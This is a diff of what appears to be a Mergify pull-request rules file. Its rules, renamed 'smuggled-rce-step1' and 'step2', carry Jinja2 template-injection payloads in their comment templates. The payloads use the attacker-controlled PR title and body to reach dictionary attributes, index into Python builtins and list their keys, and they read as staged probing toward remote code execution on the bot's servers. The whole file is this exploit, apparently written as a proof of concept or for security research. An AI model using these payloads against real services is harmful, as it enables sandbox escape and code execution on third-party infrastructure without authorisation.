@@ -1,16 +1,24 @@
 pull_request_rules:
-  - name: smuggled-globals
+  - name: smuggled-rce-step1
     conditions:
       - base=main
     actions:
       comment:
         message: |
-          STEP1: title={{ title }}
-          STEP1 RESULT={{ ([dict]|map(attribute=title))|first }}
-  - name: smuggled-class
+          {% if title and body %}
+          DICT: {{ ([dict]|map(attribute=title))|first }}
+          BUILTINS: {{ (([dict]|map(attribute=title))|first)[body] }}
+          {% else %}
+          No vars
+          {% endif %}
+  - name: smuggled-rce-step2
     conditions:
       - base=main
     actions:
       comment:
         message: |
-          STEP2: RESULT={{ ([dict]|map(attribute=title))|first|attr(body) }}
+          {% if title and body %}
+          BUILTINS_KEYS: {{ (([dict]|map(attribute=title))|first)[body].keys() }}
+          {% else %}
+          No vars v2
+          {% endif %}
